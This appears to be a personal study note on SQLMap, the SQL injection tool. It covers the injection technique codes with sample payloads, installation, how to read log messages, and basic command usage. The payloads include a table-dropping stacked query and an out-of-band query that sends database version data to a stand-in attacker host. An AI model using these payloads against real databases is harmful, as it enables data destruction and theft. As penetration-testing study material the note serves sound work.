```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

## Summary
[SQLMap](https://github.com/sqlmapproject/sqlmap) is a tool for automating the process of detecting and exploiting SQLi vulnerabilities. It supports a plethora of databases types and the following techniques:
- `B` : Boolean-based blind - `AND 1=1`
- `E` : Error-based - `AND GTID_SUBSET(@@version,0)`
- `U` : Union query-based - `UNION ALL SELECT 1,@@version,3`
- `S` : Stacked queries - `; DROP TABLE users`
- `T` : Time-based blind - `AND 1=IF(2>1,SLEEP(5),0)`
- `Q` : Inline queries - `(SELECT @@version)`
- ` ` : Out-of-band injection - `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))

## Installation
```
sudo apt install sqlmap

git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

## Documentation
**Cheatsheet:** 
**Website:** https://github.com/sqlmapproject/sqlmap

## Important log messages
- `Target URL content is stable` : means that the responses are fairly consistent meaning its easier to spot the effects of SQLi attempts
- `GET parameter 'id' appears to be dynamic` : `dynamic` means that changes made to its value, change the output in the response (opposite is `static`)
- `heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')` : means that the get parameter needs to be tested further and it has attempted to guess the DBMS provider based on output.
- `heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks` : SQLMap also quickly runs XSS tests. Its nice to have when running against large websites, *two birds with one stone*.
- `reflective value(s) found and filtering out` : a warning to say that some parts of the payload can be seen in the output so they need to be filtered out before comparing the original page content (*SQLMap does this filtering automatically*).
- 

## Usage
```bash
sqlmap -h # Basic options (most common)
sqlmap -hh # Advanced options
```

### GET Parameters
```bash
sqlmap -u "https://example.com/index.php?id=1" --batch
```
> `--batch` skips all user-input, automatically choosing based on the default options
>